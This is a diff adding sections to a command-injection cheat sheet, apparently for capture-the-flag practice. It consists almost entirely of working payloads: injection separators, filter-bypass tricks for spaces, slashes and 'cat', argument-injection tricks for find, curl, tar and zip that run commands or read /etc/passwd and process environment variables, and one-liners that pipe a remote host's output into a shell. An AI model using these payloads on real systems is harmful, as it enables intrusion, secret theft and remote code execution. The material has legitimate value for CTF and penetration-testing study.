@@ -1,5 +1,19 @@
 # Command Injection
 
+## Fast Ladder
+
+```bash
+;id
+|id
+||id
+&&id
+%0Aid
+`id`
+$(id)
+;cat /flag*
+;base64 /flag*
+```
+
 ## Payloads
 
 ```bash
@@ -50,6 +64,48 @@ alias ls=whoami;ls
 
 # Double encoding
 $(echo -e "\x77\x68\x6f\x61\x6d\x69")  # whoami in hex
+```
+
+## Constraint Payloads
+
+```bash
+# no spaces
+cat${IFS}/flag
+cat$IFS$9/flag
+{cat,/flag}
+
+# no slash
+cat ${PWD:0:1}flag
+cat $(printf "\x2f")flag
+
+# no cat
+head /flag
+tail /flag
+tac /flag
+sed -n '1,5p' /flag
+awk '{print}' /flag
+
+# length constrained
+sh</dev/tcp/HOST/PORT
+curl HOST|sh
+```
+
+## Tool Wrappers
+
+```bash
+# find
+-exec id ;
+.;id
+
+# curl
+--config /proc/self/environ
+file:///etc/passwd
+
+# tar
+--checkpoint=1 --checkpoint-action=exec=id
+
+# zip
+-T --unzip-command id
 ```
 
 ## Sending To Server
